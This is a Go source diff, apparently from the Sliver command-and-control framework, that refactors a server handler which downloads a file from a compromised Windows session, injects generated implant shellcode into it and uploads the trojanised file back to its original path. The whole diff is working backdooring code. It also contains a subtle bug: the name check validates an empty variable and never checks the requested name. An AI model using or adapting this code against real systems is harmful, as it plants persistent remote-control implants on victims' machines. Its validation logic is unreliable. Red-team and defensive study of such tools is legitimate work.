@@ -21,22 +21,41 @@ package rpc
 import (
 	"context"
 	"fmt"
-	"io/ioutil"
+	"os"
 
 	"github.com/Binject/binjection/bj"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/server/codenames"
 	"github.com/bishopfox/sliver/server/core"
+	"github.com/bishopfox/sliver/server/db"
 	"github.com/bishopfox/sliver/server/generate"
+	"github.com/bishopfox/sliver/util"
 	"github.com/bishopfox/sliver/util/encoders"
 	"google.golang.org/grpc/codes"
 	"google.golang.org/grpc/status"
 )
 
 // Backdoor - Inject a sliver payload in a file on the remote system
-func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sliverpb.Backdoor, error) {
-	resp := &sliverpb.Backdoor{}
+func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*clientpb.Backdoor, error) {
+	var (
+		name string
+		err  error
+	)
+
+	if req.Name == "" {
+		name, err = codenames.GetCodename()
+		if err != nil {
+			return nil, err
+		}
+	} else if err := util.AllowedName(name); err != nil {
+		return nil, err
+	} else {
+		name = req.Name
+	}
+
+	resp := &clientpb.Backdoor{}
 	session := core.Sessions.Get(req.Request.SessionID)
 	if session.OS != "windows" {
 		return nil, status.Error(codes.InvalidArgument, fmt.Sprintf("%s is currently not supported", session.OS))
@@ -44,7 +63,7 @@ func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sl
 	download, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
 		Request: &commonpb.Request{
 			SessionID: session.ID,
-			Timeout:   int64(30),
+			Timeout:   req.Request.Timeout,
 		},
 		Path: req.FilePath,
 	})
@@ -76,12 +95,22 @@ func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sl
 		return nil, fmt.Errorf("please select a profile targeting a shellcode format")
 	}
 
-	name, config := generate.ImplantConfigFromProtobuf(p.Config)
-	fPath, err := generate.SliverShellcode(name, config)
+	build, err := generate.GenerateConfig(name, p.Config)
+	if err != nil {
+		return nil, err
+	}
+
+	// retrieve http c2 implant config
+	httpC2Config, err := db.LoadHTTPC2ConfigByName(p.Config.HTTPC2ConfigName)
 	if err != nil {
 		return nil, status.Error(codes.Internal, err.Error())
 	}
-	shellcode, err := ioutil.ReadFile(fPath)
+
+	fPath, err := generate.SliverShellcode(name, build, p.Config, httpC2Config.ImplantConfig)
+	if err != nil {
+		return nil, status.Error(codes.Internal, err.Error())
+	}
+	shellcode, err := os.ReadFile(fPath)
 	if err != nil {
 		return nil, status.Error(codes.Internal, err.Error())
 	}
@@ -92,7 +121,7 @@ func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sl
 	if err != nil {
 		return nil, status.Error(codes.Internal, err.Error())
 	}
-	uploadGzip := new(encoders.Gzip).Encode(newFile)
+	uploadGzip, _ := new(encoders.Gzip).Encode(newFile)
 	// upload to remote target
 	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
 		Encoder: "gzip",
@@ -100,7 +129,7 @@ func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sl
 		Path:    req.FilePath,
 		Request: &commonpb.Request{
 			SessionID: session.ID,
-			Timeout:   int64(30),
+			Timeout:   req.Request.Timeout,
 		},
 	})
 	if err != nil {
